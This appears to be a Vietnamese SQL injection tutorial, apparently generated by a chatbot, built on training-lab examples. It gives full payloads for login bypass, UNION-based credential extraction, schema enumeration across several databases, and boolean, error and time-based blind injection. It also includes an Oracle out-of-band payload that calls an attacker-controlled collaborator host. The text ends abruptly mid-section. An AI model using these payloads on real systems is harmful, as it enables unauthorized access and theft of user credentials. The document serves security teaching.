# SQL Injection (SQLi)

## 1. What is SQL injection (SQLi)?
**SQL Injection** là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào các truy vấn (queries) mà ứng dụng thực hiện đến cơ sở dữ liệu. 

Về cơ bản, SQLi cho phép kẻ tấn công xem dữ liệu mà chúng thường không thể truy cập (ví dụ: dữ liệu của người dùng khác, thông tin nhạy cảm của hệ thống). Trong nhiều trường hợp, kẻ tấn công có thể sửa đổi hoặc xóa dữ liệu này, gây ra những thay đổi vĩnh viễn cho ứng dụng.

> 💡 **Giải thích thêm (Deep Dive):**
> Bản chất của SQLi nằm ở sự **nhập nhằng giữa dữ liệu (data) và lệnh (code)**. 
> 
> Thông thường, lập trình viên viết code SQL và để trống các chỗ cho dữ liệu người dùng (ví dụ: username). Nếu không được xử lý đúng cách, kẻ tấn công sẽ nhập vào các ký tự đặc biệt của SQL (như `'`, `--`, `;`, `OR`) để đóng chuỗi dữ liệu sớm và bắt đầu viết lệnh mới cho Database thực thi. Database không thể phân biệt đâu là ý định ban đầu của lập trình viên và đâu là phần kẻ tấn công "viết thêm vào".

---

## 2. What is the impact of SQL injection?
Tác động của SQLi có thể cực kỳ nghiêm trọng:

*   **Lộ lọt dữ liệu nhạy cảm:** Truy cập trái phép thông tin người dùng (mật khẩu, thông tin thẻ tín dụng, thông tin cá nhân).
*   **Chiếm quyền điều khiển:** Vượt qua cơ chế đăng nhập (Bypass login) để vào vai quản trị viên.
*   **Thao tác dữ liệu:** Chỉnh sửa số dư tài khoản, xóa bảng dữ liệu, hoặc làm hỏng toàn bộ nội dung ứng dụng.
*   **Tấn công sâu vào hạ tầng:** Trong một số cấu hình (như trên MSSQL hoặc Oracle), SQLi có thể dẫn đến **Remote Code Execution (RCE)** – cho phép kẻ tấn công thực thi lệnh trực tiếp trên hệ điều hành của máy chủ database, từ đó xâm nhập sâu hơn vào mạng nội bộ.

---

# PHẦN 2: CÁC VÍ DỤ TẤN CÔNG SQL INJECTION KINH ĐIỂN

Phần này sẽ đi sâu vào hai ví dụ tấn công phổ biến nhất mà bạn sẽ gặp trong thực tế, giúp bạn hiểu cách kẻ tấn công lợi dụng SQLi để phá vỡ các chức năng cốt lõi của ứng dụng.

## 2.1. Retrieving hidden data (Truy xuất dữ liệu ẩn)
Mục tiêu của kiểu tấn công này là truy cập vào các dữ liệu có tồn tại trong cơ sở dữ liệu nhưng không được hiển thị cho người dùng thông thường.

#### A. Bối cảnh (Context)
Hãy tưởng tượng một trang web bán hàng có chức năng lọc sản phẩm theo danh mục. Khi bạn chọn danh mục "Quà tặng", URL có dạng:
`https://insecure-website.com/products?category=Gifts`

Ứng dụng sẽ thực hiện một truy vấn SQL để lấy về tất cả sản phẩm thuộc danh mục "Gifts" **VÀ** đã được phát hành (published).

#### B. Phân tích câu lệnh SQL gốc (Phía Back-end)
Câu lệnh SQL mà lập trình viên dự định sẽ trông như sau:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1;```

Trong đó:
*   `'Gifts'` là dữ liệu bạn cung cấp qua URL.
*   `AND released = 1` là một điều kiện cố định mà lập trình viên thêm vào để đảm bảo chỉ những sản phẩm được đánh dấu là "đã phát hành" mới được hiển thị. Dữ liệu của các sản phẩm chưa phát hành (`released = 0`) vẫn nằm trong bảng `products`.

#### C. Xây dựng Payload tấn công
Kẻ tấn công muốn xem cả những sản phẩm chưa phát hành. Để làm điều này, họ cần phải **vô hiệu hóa** điều kiện `AND released = 1`. Họ sẽ sử dụng payload sau:

```
' OR 1=1--
```
Khi chèn vào URL, nó sẽ trở thành:
`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

#### D. Phân tích chi tiết Payload
1.  **`'` (Dấu nháy đơn):** Ký tự này dùng để **đóng lại** chuỗi `'Gifts'`. Sau ký tự này, câu lệnh SQL sẽ trông như sau: `SELECT * FROM products WHERE category = 'Gifts'`
2.  **`OR 1=1`:** Đây là một mệnh đề logic **luôn luôn đúng**. Khi kết hợp với mệnh đề `OR`, nó sẽ khiến toàn bộ điều kiện `WHERE` trở thành đúng với **mọi hàng** trong bảng `products`, bất kể `category` là gì.
3.  **`--` (Comment):** Đây là bước quan trọng nhất. Dấu `--` (và một khoảng trắng theo sau) báo cho Database rằng tất cả những gì đứng sau nó chỉ là chú thích và cần được bỏ qua. Điều này giúp vô hiệu hóa hoàn toàn phần `AND released = 1;` mà lập trình viên đã viết.

#### E. Câu lệnh SQL sau khi bị tấn công
Khi payload được thực thi, câu lệnh SQL cuối cùng mà Database nhận được sẽ là:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1;
```
Database sẽ đọc nó như sau: "Lấy tất cả các cột từ bảng `products` với điều kiện `category = 'Gifts'` hoặc `1=1`". Vì `1=1` luôn đúng, nên điều kiện `WHERE` sẽ đúng với tất cả các sản phẩm. Phần `AND released = 1` đã bị vô hiệu hóa.

**Kết quả:** Trang web sẽ hiển thị **tất cả sản phẩm** trong bảng `products`, bao gồm cả những sản phẩm chưa được phát hành.

---

## 2.2. Subverting application logic (Phá vỡ logic ứng dụng - Bypass Đăng nhập)
Đây là ví dụ kinh điển nhất của SQLi, nơi kẻ tấn công có thể đăng nhập vào tài khoản người dùng (thường là admin) mà không cần biết mật khẩu.

#### A. Bối cảnh
Một trang đăng nhập đơn giản yêu cầu username và password.

#### B. Phân tích câu lệnh SQL gốc
Khi người dùng nhấn "Đăng nhập", ứng dụng sẽ thực hiện một truy vấn tương tự như sau:

```sql
SELECT * FROM users WHERE username = 'administrator' AND password = 'mysecretpassword';
```

Logic của ứng dụng là: Nếu truy vấn này trả về **ít nhất một hàng** (tức là có user với username và password khớp), thì đăng nhập thành công.

#### C. Xây dựng Payload tấn công
Kẻ tấn công nhập vào các trường như sau:
*   **Username:** `administrator'--`
*   **Password:** (Để trống hoặc nhập bất cứ thứ gì)

#### D. Phân tích chi tiết Payload
1.  **`administrator'`:** Tương tự như trên, phần `administrator` là username hợp lệ, và dấu nháy đơn `'` dùng để đóng chuỗi `'administrator'`.
2.  **`--` (Comment):** Ký tự này sẽ vô hiệu hóa phần còn lại của câu lệnh, chính là phần kiểm tra mật khẩu `AND password = '...'`.

#### E. Câu lệnh SQL sau khi bị tấn công
Database sẽ nhận được câu lệnh:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'somepassword';
```
Database sẽ hiểu câu lệnh này là: "Lấy tất cả các cột từ bảng `users` với điều kiện `username = 'administrator'`". Phần kiểm tra mật khẩu đã bị bỏ qua hoàn toàn.

**Kết quả:** Vì tài khoản `administrator` có tồn tại, truy vấn sẽ trả về thông tin của tài khoản đó. Ứng dụng thấy có dữ liệu trả về và cho phép kẻ tấn công đăng nhập thành công với quyền của admin.

> 💡 **Giải thích thêm: Trường hợp không biết Username Admin**
> Nếu kẻ tấn công không biết username là gì, họ có thể dùng một payload khác trong trường username: `' OR 1=1--`
> 
> *   **Câu lệnh bị tấn công:** `SELECT * FROM users WHERE username = '' OR 1=1--' AND password = '...';`
> *   **Logic:** Điều kiện `WHERE` trở thành đúng với tất cả các user.
> *   **Kết quả:** Truy vấn sẽ trả về **tất cả các user** trong bảng. Hầu hết các ứng dụng sẽ chỉ xử lý hàng đầu tiên trả về. Vì tài khoản đầu tiên trong bảng `users` thường là tài khoản admin được tạo sớm nhất, kẻ tấn công sẽ được đăng nhập với quyền của tài khoản đó.

Chắc chắn rồi. Tôi sẽ trình bày Phần 3 với mức độ chi tiết cao nhất. Tôi sẽ không chỉ đưa ra payload, mà còn phân tích từng thành phần, giải thích tại sao phải thực hiện từng bước, và các biến thể cần thiết khi đối mặt với các hệ quản trị CSDL khác nhau.

---

# PHẦN 3: TẤN CÔNG UNION-BASED (SIÊU CHI TIẾT)

## 3.1. UNION-based SQLi là gì?
Toán tử `UNION` trong SQL được sử dụng để kết hợp kết quả của hai hoặc nhiều câu lệnh `SELECT` thành một tập kết quả duy nhất. Tấn công UNION-based lợi dụng tính năng này để nối kết quả từ một truy vấn độc hại do kẻ tấn công tạo ra vào kết quả của truy vấn gốc hợp lệ.

> 💡 **Deep Dive: Bản chất của kỹ thuật**
> Hãy tưởng tượng ứng dụng chỉ cho phép bạn xem danh sách sản phẩm (Truy vấn A). Bằng cách tiêm `UNION`, bạn có thể nói với Database rằng: "Hãy chạy Truy vấn A, sau đó chạy thêm Truy vấn B (ví dụ: lấy username và password), rồi gộp chung kết quả của cả hai lại và hiển thị ra màn hình". Trang web, vì chỉ mong đợi dữ liệu sản phẩm, sẽ vô tình hiển thị luôn cả dữ liệu nhạy cảm mà bạn yêu cầu.

### Điều kiện tiên quyết để tấn công UNION thành công
Để một cuộc tấn công `UNION` hoạt động, hai điều kiện **bắt buộc** phải được thỏa mãn:
1.  **Số lượng cột phải bằng nhau:** Truy vấn gốc và truy vấn bạn tiêm vào phải trả về cùng một số lượng cột.
2.  **Kiểu dữ liệu phải tương thích:** Kiểu dữ liệu trong mỗi cột tương ứng phải tương thích với nhau (ví dụ: cột thứ nhất của cả hai truy vấn đều là số, hoặc đều là chuỗi, hoặc có thể chuyển đổi qua lại được).

---

## 3.2. Quy trình tấn công UNION-based từng bước

### Bước 1: Xác định số lượng cột (Determining the number of columns)
Đây là bước đầu tiên và quan trọng nhất. Chúng ta cần tìm ra có bao nhiêu cột được trả về bởi truy vấn gốc. Có hai phương pháp chính:

#### Phương pháp A: Sử dụng `ORDER BY`
Mệnh đề `ORDER BY` có thể nhận một con số để chỉ định cột cần sắp xếp theo (ví dụ `ORDER BY 1` là sắp xếp theo cột thứ nhất). Chúng ta sẽ lợi dụng điều này bằng cách thử tăng dần con số cho đến khi ứng dụng báo lỗi.

*   **Quy trình thử (Trial-and-error):**
    1.  Thử `ORDER BY 1`. Nếu trang tải bình thường, truy vấn có ít nhất 1 cột.
    2.  Thử `ORDER BY 2`. Nếu trang tải bình thường, truy vấn có ít nhất 2 cột.
    3.  Thử `ORDER BY 3`. Nếu trang tải bình thường, truy vấn có ít nhất 3 cột.
    4.  Thử `ORDER BY 4`. Nếu trang báo lỗi (thường là "Unknown column", "Out of range" hoặc lỗi 500), điều đó có nghĩa là **truy vấn gốc chỉ có 3 cột**.

*   **Ví dụ Payload trên URL:**
    ```
    https://insecure-website.com/products?category=Gifts' ORDER BY 3--  (Thành công)
    https://insecure-website.com/products?category=Gifts' ORDER BY 4--  (Thất bại)
    ```

#### Phương pháp B: Sử dụng `UNION SELECT NULL`
Đây là phương pháp trực tiếp hơn. Chúng ta thử `UNION` với các số lượng `NULL` khác nhau cho đến khi không còn lỗi.

*   **Tại sao lại dùng `NULL`?**
    `NULL` là một giá trị đặc biệt trong SQL, nó có thể được chuyển đổi thành **bất kỳ kiểu dữ liệu nào** (số, chuỗi, ngày tháng...). Điều này giúp chúng ta vượt qua điều kiện số 2 (tương thích kiểu dữ liệu) một cách dễ dàng.

*   **Quy trình thử:**
    1.  `' UNION SELECT NULL--` -> Báo lỗi.
    2.  `' UNION SELECT NULL,NULL--` -> Báo lỗi.
    3.  `' UNION SELECT NULL,NULL,NULL--` -> Trang tải bình thường.
    *   **Kết luận:** Truy vấn gốc có 3 cột.

---

### Bước 2: Tìm các cột có kiểu dữ liệu chuỗi (Finding columns with a useful data type)
Sau khi biết truy vấn có 3 cột, chúng ta cần xác định cột nào trong số đó có kiểu dữ liệu dạng văn bản (string, text, varchar...) để có thể hiển thị dữ liệu chúng ta muốn trích xuất.

*   **Quy trình:**
    Chúng ta sẽ thay thế từng giá trị `NULL` bằng một chuỗi ký tự ngẫu nhiên (ví dụ: `'aBcDe'`) và quan sát xem chuỗi đó có xuất hiện trên trang web hay không.

*   **Ví dụ Payload:**
    1.  `' UNION SELECT 'aBcDe',NULL,NULL--`
    2.  `' UNION SELECT NULL,'aBcDe',NULL--`
    3.  `' UNION SELECT NULL,NULL,'aBcDe'--`

*   **Phân tích kết quả:**
    Giả sử khi bạn thử payload số 2, bạn thấy chuỗi `'aBcDe'` xuất hiện ở vị trí tên sản phẩm trên trang. Điều này xác nhận rằng:
    *   Cột thứ hai có kiểu dữ liệu văn bản.
    *   Dữ liệu từ cột thứ hai được ứng dụng hiển thị ra màn hình.
    *   Chúng ta có thể sử dụng cột này để hiển thị kết quả của các truy vấn con.

> 💡 **Deep Dive: Xử lý khi gặp lỗi "Conversion failed..."**
> Nếu bạn thử `'aBcDe'` vào một cột kiểu số, bạn có thể nhận được lỗi `Conversion failed when converting the varchar value 'aBcDe' to data type int`. Điều này cũng là một thông tin hữu ích, nó xác nhận cột đó là kiểu số. Lúc này bạn chỉ cần giữ lại `NULL` cho cột đó và thử tiếp với các cột khác.

---

### Bước 3: Truy xuất dữ liệu bạn muốn (Retrieving interesting data)
Khi đã có đủ thông tin (3 cột, cột số 2 là kiểu chuỗi), giờ là lúc khai thác. Bạn chỉ cần thay thế chuỗi `'aBcDe'` bằng một truy vấn con (`subquery`) để lấy dữ liệu.

*   **Ví dụ 1: Lấy phiên bản Database (Rất quan trọng để biết dùng payload nào tiếp theo)**

```sql
' UNION SELECT NULL, @@version, NULL--
```
    *Lưu ý: `@@version` dành cho MySQL/MSSQL. PostgreSQL dùng `version()`.*

*   **Ví dụ 2: Lấy danh sách username và password từ bảng `users`**

```sql
' UNION SELECT NULL, username, password FROM users--
```
    *Lưu ý: Payload này sẽ gây lỗi nếu truy vấn gốc chỉ có 2 cột. Chúng ta cần một kỹ thuật khác.*

---

### Bước 4: Ghép nhiều giá trị vào một cột (Retrieving multiple values in a single column)
Đây là kỹ thuật cực kỳ quan trọng khi bạn có ít cột hiển thị hơn số lượng dữ liệu bạn muốn lấy. Ví dụ: bạn chỉ có thể hiển thị dữ liệu ở cột 2, nhưng bạn muốn lấy cả `username` và `password`.

*   **Giải pháp:** Nối chuỗi (String Concatenation).

*   **Cú pháp nối chuỗi tùy theo hệ quản trị CSDL:**
| Database | Cú pháp nối chuỗi |
| :--- | :--- |
| **PostgreSQL** | `string1 || string2` |
| **MySQL** | `CONCAT(string1, string2)` |
| **Oracle** | `string1 || string2` hoặc `CONCAT(string1, string2)` |
| **MS SQL Server** | `string1 + string2` |

*   **Ví dụ Payload hoàn chỉnh (trên PostgreSQL):**
    Chúng ta sẽ nối `username` và `password`, ngăn cách bởi dấu `~` để dễ đọc.

    ```sql
    ' UNION SELECT NULL, username || '~' || password, NULL FROM users--
    ```
*   **Kết quả:** Trên trang web, tại vị trí tên sản phẩm, bạn sẽ thấy các chuỗi như:
    *   `administrator~s3cr3t_p4ssw0rd`
    *   `carlos~montoya_rul3z`
    *   ...

---

# PHẦN 4: KHÁM PHÁ CƠ SỞ DỮ LIỆU (SIÊU CHI TIẾT)

Sau khi đã xác định được một điểm có thể khai thác SQL Injection (ví dụ: thông qua UNION-based), bước tiếp theo là tìm hiểu về chính cơ sở dữ liệu đó. Mục tiêu là trả lời các câu hỏi:
*   Chúng ta đang đối mặt với loại DB nào (MySQL, Oracle, PostgreSQL, MSSQL...)?
*   Có những bảng (tables) nào trong DB này?
*   Mỗi bảng chứa những cột (columns) nào?

Biết được những thông tin này sẽ giúp chúng ta xây dựng các payload chính xác để trích xuất dữ liệu nhạy cảm.

## 4.1. Truy vấn Loại và Phiên bản Database (Querying the database type and version)
Đây là bước đầu tiên và cực kỳ quan trọng vì cú pháp truy vấn để lấy tên bảng, tên cột sẽ khác nhau rất nhiều giữa các hệ quản trị CSDL.

#### A. Tại sao cần biết phiên bản?
*   **Cú pháp:** Các phiên bản DB cũ có thể không hỗ trợ một số hàm hoặc cấu trúc truy vấn nhất định.
*   **Lỗ hổng đã biết:** Một phiên bản DB cụ thể có thể tồn tại các lỗ hổng đã được công bố (CVEs), cho phép leo thang đặc quyền từ SQLi lên thực thi mã lệnh trên hệ điều hành (RCE).
*   **Cấu trúc Metadata:** Cách các bảng hệ thống (information schema) được tổ chức có thể thay đổi giữa các phiên bản.

#### B. Các Payload phổ biến
Chúng ta sẽ sử dụng kỹ thuật tấn công UNION đã học ở Phần 3 để hiển thị thông tin phiên bản. Giả sử chúng ta đã biết truy vấn gốc có 2 cột và cả hai đều có thể hiển thị dữ liệu chuỗi.

*   **Oracle:**
    ```sql
    ' UNION SELECT banner, NULL FROM v$version--
    ```
    *   **Kết quả có thể trả về:**
        `Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production`
    *   **💡 Deep Dive:** `v$version` là một "View" hệ thống trong Oracle, chứa thông tin chi tiết về phiên bản. Chúng ta chọn cột `banner` vì nó chứa chuỗi mô tả đầy đủ.

*   **Microsoft SQL Server:**
    ```sql
    ' UNION SELECT NULL, @@version--
    ```
    *   **Kết quả có thể trả về:**
        `Microsoft SQL Server 2016 (RTM) - 13.0.1601.5 (X64) ...`
    *   **💡 Deep Dive:** `@@version` là một biến toàn cục (global variable) của MSSQL, luôn có sẵn để truy cập và chứa thông tin phiên bản.

*   **PostgreSQL:**
    ```sql
com
    ' UNION SELECT version(), NULL--
    ```
    *   **Kết quả có thể trả về:**
        `PostgreSQL 13.2 (Debian 13.2-1.pgdg100+1) on x86_64-pc-linux-gnu ...`
    *   **💡 Deep Dive:** `version()` là một hàm nội trang (built-in function) của PostgreSQL.

*   **MySQL:**
    ```sql
    ' UNION SELECT @@version, NULL--
    ```
    *   **Kết quả có thể trả về:**
        `5.7.22-0ubuntu0.16.04.1`
    *   **💡 Deep Dive:** Tương tự MSSQL, `@@version` là một biến hệ thống của MySQL.

---

## 4.2. Liệt kê nội dung của Cơ sở dữ liệu (Listing the contents of the database)
Sau khi đã biết loại DB, chúng ta sẽ truy vấn các bảng siêu dữ liệu (metadata tables) của nó để lấy danh sách các bảng và cột do người dùng định nghĩa (user-defined tables).

### A. Trên các hệ CSDL Non-Oracle (MySQL, MSSQL, PostgreSQL...)
Hầu hết các hệ CSDL hiện đại đều tuân thủ một tiêu chuẩn gọi là `information_schema`. Đây là một tập hợp các "view" chứa thông tin về tất cả các đối tượng trong DB.

#### 1. Lấy danh sách các bảng (Listing tables)
Chúng ta sẽ truy vấn view `information_schema.tables` để lấy tên tất cả các bảng.

*   **Payload:**
    ```sql
    ' UNION SELECT table_name, NULL FROM information_schema.tables--
    ```
*   **Kết quả có thể trả về:** Một danh sách dài các bảng, bao gồm cả bảng hệ thống và bảng của ứng dụng. Chúng ta cần tìm những tên bảng có vẻ "thú vị" như `users`, `accounts`, `credit_cards`...

#### 2. Lấy danh sách các cột của một bảng cụ thể (Listing columns)
Khi đã xác định được một bảng mục tiêu (ví dụ: `users_abcdef`), chúng ta sẽ truy vấn view `information_schema.columns` để xem nó có những cột nào.

*   **Payload:**
    ```sql
    ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_abcdef'--
    ```
    *   **💡 Deep Dive:** Mệnh đề `WHERE table_name = 'users_abcdef'` là cực kỳ quan trọng để lọc ra chỉ những cột thuộc về bảng mà chúng ta quan tâm.

*   **Kết quả có thể trả về:**
    *   `user_id`
    *   `username_ghijk`
    *   `password_lmnop`

#### 3. Hoàn tất cuộc tấn công
Khi đã có tên bảng (`users_abcdef`) và tên các cột (`username_ghijk`, `password_lmnop`), chúng ta có thể kết hợp chúng lại trong một cuộc tấn công UNION cuối cùng để trích xuất dữ liệu.

*   **Payload cuối cùng:**
    ```sql
    ' UNION SELECT username_ghijk, password_lmnop FROM users_abcdef--
    ```

### B. Trên hệ CSDL Oracle
Oracle không sử dụng `information_schema`. Thay vào đó, nó có một hệ thống bảng siêu dữ liệu riêng.

#### 1. Lấy danh sách các bảng
*   **Payload:**
    ```sql
    ' UNION SELECT table_name, NULL FROM all_tables--
    ```
    *   **💡 Deep Dive:** `all_tables` là một view của Oracle liệt kê tất cả các bảng mà người dùng hiện tại có quyền truy cập. Một view khác là `user_tables` chỉ liệt kê các bảng thuộc sở hữu của người dùng hiện tại. `all_tables` thường cho nhiều thông tin hơn.

#### 2. Lấy danh sách các cột của một bảng
*   **Payload:**
    ```sql
    ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_ABCDEF'--
    ```
    *   **Lưu ý quan trọng:** Oracle thường lưu tên bảng và tên cột ở dạng **CHỮ IN HOA**. Nếu bạn tìm kiếm với `table_name = 'users_abcdef'` (chữ thường), truy vấn sẽ không trả về kết quả nào.

#### 3. Hoàn tất cuộc tấn công trên Oracle
*   **Payload cuối cùng:**
    ```sql
    ' UNION SELECT USERNAME_GHIJK, PASSWORD_LMNOP FROM USERS_ABCDEF--
    ```
    
---

# PHẦN 5: BLIND SQL INJECTION (SIÊU CHI TIẾT)

## 5.1. Blind SQL Injection là gì?
**Blind SQL Injection** (SQLi Mù) là một dạng tấn công SQL Injection nơi ứng dụng web **không trả về kết quả** của truy vấn độc hại hoặc **không hiển thị thông báo lỗi** chi tiết của cơ sở dữ liệu trực tiếp trên giao diện.

Trong khi với tấn công UNION (Phần 3), bạn có thể thấy ngay lập tức dữ liệu được trích xuất (ví dụ: `administrator~s3cr3t_p4ssw0rd`), thì với Blind SQLi, trang web gần như không có gì thay đổi. Kẻ tấn công phải suy luận ra thông tin một cách gián tiếp bằng cách quan sát những thay đổi tinh vi trong phản hồi của ứng dụng, giống như một người "mù" đang dò dẫm trong bóng tối.

Thông tin được khai thác dựa trên hai kênh chính:
1.  **Thay đổi trong nội dung trang (Boolean-based):** Dựa vào việc một nội dung nào đó xuất hiện hay biến mất.
2.  **Sự khác biệt về thời gian phản hồi (Time-based):** Dựa vào việc trang web phản hồi nhanh hay chậm một cách có chủ đích.

---

## 5.2. Kỹ thuật 1: Phản hồi có điều kiện (Conditional Responses)
Đây là kỹ thuật Blind SQLi cơ bản nhất, dựa trên việc đặt cho cơ sở dữ liệu các câu hỏi **Đúng/Sai** và quan sát sự thay đổi trên trang.

#### A. Bối cảnh
Hãy tưởng tượng một ứng dụng có cookie theo dõi phiên làm việc, ví dụ: `TrackingId`. Khi cookie hợp lệ, trang web hiển thị thông điệp "Welcome back!".
*   **Truy vấn gốc:**
    ```sql
    SELECT TrackingId FROM tracked_users WHERE TrackingId = 'abcdef123456';
    ```
    Nếu truy vấn này trả về kết quả, thông điệp "Welcome back!" sẽ xuất hiện.

#### B. Quy trình tấn công từng bước

**Bước 1: Xác nhận lỗ hổng**
Chúng ta tiêm các điều kiện luôn đúng và luôn sai để xem ứng dụng có phản ứng khác nhau không.
*   **Payload Đúng:** `' AND '1'='1`
    *   Câu lệnh cuối cùng: `... WHERE TrackingId = 'abcdef123456' AND '1'='1'` (Hợp lệ)
    *   Kết quả: Trang vẫn hiển thị "Welcome back!".
*   **Payload Sai:** `' AND '1'='2`
    *   Câu lệnh cuối cùng: `... WHERE TrackingId = 'abcdef123456' AND '1'='2'` (Không hợp lệ)
    *   Kết quả: Thông điệp "Welcome back!" biến mất.
*   **Kết luận:** Sự khác biệt này xác nhận lỗ hổng Blind SQLi dạng Boolean-based.

**Bước 2: Kiểm tra sự tồn tại của bảng `users`**
Chúng ta hỏi DB: "Có bảng nào tên là `users` không?".
*   **Payload:** `' AND (SELECT 'a' FROM users LIMIT 1) = 'a`
*   **💡 Deep Dive: Phân tích Payload**
    *   `SELECT 'a' FROM users LIMIT 1`: Truy vấn con này sẽ thành công và trả về chuỗi `'a'` nếu bảng `users` tồn tại. Nếu không, nó sẽ gây ra lỗi và toàn bộ điều kiện `AND` sẽ sai.
    *   `... = 'a'`: So sánh kết quả của truy vấn con với `'a'`.
*   **Kết quả:**
    *   Nếu "Welcome back!" xuất hiện -> Bảng `users` tồn tại.
    *   Nếu thông điệp biến mất -> Bảng `users` không tồn tại.

**Bước 3: Xác định độ dài mật khẩu của người dùng `administrator`**
Chúng ta hỏi hàng loạt câu hỏi để tìm ra độ dài chính xác.
*   **Payload kiểm tra độ dài > 1:**
    `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password) > 1) = 'a`
*   **Quy trình:** Kẻ tấn công sẽ lặp lại payload trên, tăng dần con số `1` lên `2`, `3`, ..., cho đến khi điều kiện trở thành sai.
    *   `... LENGTH(password) > 19` -> Đúng ("Welcome back!" xuất hiện)
    *   `... LENGTH(password) > 20` -> Sai ("Welcome back!" biến mất)
*   **Kết luận:** Mật khẩu của `administrator` có chính xác 20 ký tự.

**Bước 4: Trích xuất từng ký tự của mật khẩu**
Đây là bước tốn thời gian nhất. Chúng ta dùng hàm `SUBSTRING` để hỏi về từng ký tự một.
*   **Payload kiểm tra ký tự đầu tiên có phải là 'a' không:**
    `' AND (SELECT 'a' FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1) = 'a') = 'a`
*   **💡 Deep Dive: Hàm `SUBSTRING`**
    *   `SUBSTRING(string, start, length)`: Trích xuất một chuỗi con từ `string`.
    *   `SUBSTRING(password, 1, 1)`: Lấy 1 ký tự từ chuỗi `password`, bắt đầu từ vị trí thứ 1.
*   **Quy trình:**
    Kẻ tấn công sẽ thử từng ký tự cho vị trí thứ nhất (`a`, `b`, `c`...). Sau khi tìm ra, họ sẽ chuyển sang vị trí thứ hai (`SUBSTRING(password, 2, 1)`) và lặp lại. Quá trình này có thể được tự động hóa bằng các công cụ như Burp Intruder.

---

## 5.3. Kỹ thuật 2: Gây ra lỗi SQL có điều kiện (Conditional Errors)
Kỹ thuật này được dùng khi ứng dụng không thay đổi nội dung trang, nhưng vẫn trả về lỗi HTTP 500 nếu truy vấn SQL bị lỗi cú pháp.

#### A. Nguyên lý
Chúng ta sẽ xây dựng một payload mà nó chỉ gây ra lỗi khi một điều kiện là **Đúng**.
*   Nếu điều kiện đúng -> Gây lỗi (HTTP 500).
*   Nếu điều kiện sai -> Không gây lỗi (HTTP 200).

#### B. Payload
Chúng ta sử dụng mệnh đề `CASE ... END` để tạo logic này.
*   **Payload (trên Oracle):**
    ```sql
    ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NOT NULL--
    ```
*   **💡 Deep Dive: Phân tích Payload**
    *   `CASE WHEN (1=1)`: Điều kiện chúng ta muốn kiểm tra.
    *   `THEN TO_CHAR(1/0)`: Nếu điều kiện đúng, thực hiện phép chia cho 0, **hành động này sẽ gây ra lỗi database**. `TO_CHAR` dùng để đảm bảo kiểu dữ liệu phù hợp.
    *   `ELSE NULL END`: Nếu điều kiện sai, trả về `NULL`, không gây ra lỗi.
    *   `FROM dual`: `dual` là một bảng đặc biệt trong Oracle được dùng cho các truy vấn không cần dữ liệu từ bảng thực tế.
*   **Áp dụng để trích xuất mật khẩu:**
    `' AND (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN TO_CHAR(1/0) ELSE NULL END FROM users) IS NOT NULL--`
    *   Nếu ký tự đầu tiên là 'a' -> Ứng dụng trả về lỗi HTTP 500.
    *   Nếu không phải -> Ứng dụng trả về HTTP 200.

---

## 5.4. Kỹ thuật 3: Gây ra độ trễ thời gian (Time Delays)
Đây là kỹ thuật mạnh nhất, được sử dụng khi ứng dụng "trơ" hoàn toàn: không thay đổi nội dung, cũng không báo lỗi.

#### A. Nguyên lý
Chúng ta ép cơ sở dữ liệu phải "ngủ" hoặc "chờ" một khoảng thời gian nhất định (ví dụ: 10 giây) **chỉ khi** một điều kiện là đúng. Kẻ tấn công sẽ đo thời gian phản hồi của trang web.
*   Nếu trang phản hồi sau ~10 giây -> Điều kiện đúng.
*   Nếu trang phản hồi ngay lập tức -> Điều kiện sai.

#### B. Payload (tùy thuộc vào hệ CSDL)

*   **PostgreSQL:**
    `' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--`
*   **Microsoft SQL Server:**
    `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
*   **MySQL:**
    `' AND IF(1=1, sleep(10), 'a')--`
*   **Oracle:** (Phức tạp hơn, dùng một gói lệnh)
    `' AND (SELECT CASE WHEN (1=1) THEN dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual) IS NOT NULL--`

#### C. Áp dụng để trích xuất mật khẩu (Ví dụ trên PostgreSQL)
`' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1) > 'm') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--`
Bằng cách hỏi "ký tự đầu tiên có lớn hơn 'm' không?", kẻ tấn công có thể dùng thuật toán tìm kiếm nhị phân (binary search) để tìm ra ký tự chính xác một cách nhanh chóng thay vì thử từng ký tự một.

---

## 5.5. Kỹ thuật 4: Sử dụng Out-of-Band (OAST)
Đây là kỹ thuật "át chủ bài", được dùng khi các kỹ thuật trên thất bại, đặc biệt là khi các truy vấn được xử lý bất đồng bộ, khiến việc đo thời gian trở nên vô nghĩa.

#### A. Nguyên lý
Chúng ta tiêm một payload buộc cơ sở dữ liệu phải thực hiện một tương tác mạng ra bên ngoài (DNS lookup hoặc HTTP request) đến một máy chủ mà chúng ta kiểm soát.
*   Nếu máy chủ của chúng ta nhận được một kết nối -> Điều kiện đúng.
*   Nếu không có gì xảy ra -> Điều kiện sai.

#### B. Công cụ và Payload
Công cụ phổ biến nhất cho việc này là **Burp Collaborator** của PortSwigger.
*   **Payload (Ví dụ trên Oracle):**
    `' AND (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-COLLABORATOR-SUBDOMAIN.oastify.com/"> %remote;]>'),'/l') FROM dual)--`
*   **💡 Deep Dive: Logic hoạt động**
    Payload này lợi dụng trình phân tích XML của Oracle. Khi xử lý, nó sẽ cố gắng lấy một DTD (Document Type Definition) từ URL được cung cấp. URL này trỏ đến server Burp Collaborator.
*   Kẻ tấn công chỉ cần gói payload này vào một điều kiện:
